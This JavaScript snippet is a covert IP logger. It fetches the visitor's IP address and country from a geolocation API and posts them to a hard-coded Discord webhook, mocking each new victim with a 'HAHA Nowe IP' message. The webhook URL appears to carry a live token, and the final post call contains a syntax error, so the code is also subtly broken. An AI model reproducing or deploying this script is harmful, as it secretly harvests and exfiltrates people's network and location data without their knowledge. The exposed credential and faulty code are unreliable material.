var urllink = "https://discord.com/api/webhooks/1076143106380013628/KgYoVypbx_ODnJ7GMLBx2j2zoqoWtnfOFW3QwY0PFAhDJDujNOKdH_BgSh0IUQYXXRg_";

$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
  console.log(JSON.stringify(data, null, 2));
});

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://api.db-ip.com/v2/free/self');
    const data = await response.json();
    console.log(data);

    // Declaring variables
    var ip = data.ipAddress;
    var country = data.countryName;
    var params = {
        username:   "IP Log",
        avatar_url: "",
        content:    "HAHA Nowe IP \n" + 
		    "__**:globe_with_meridians: IP Address:**__ \n" +
                    "`" + ip + "` \n \n" +
		    "__**Country:**__ \n" +
		    "`" + country + "`"
    }

    $.post(urllink, {params);

}

request();
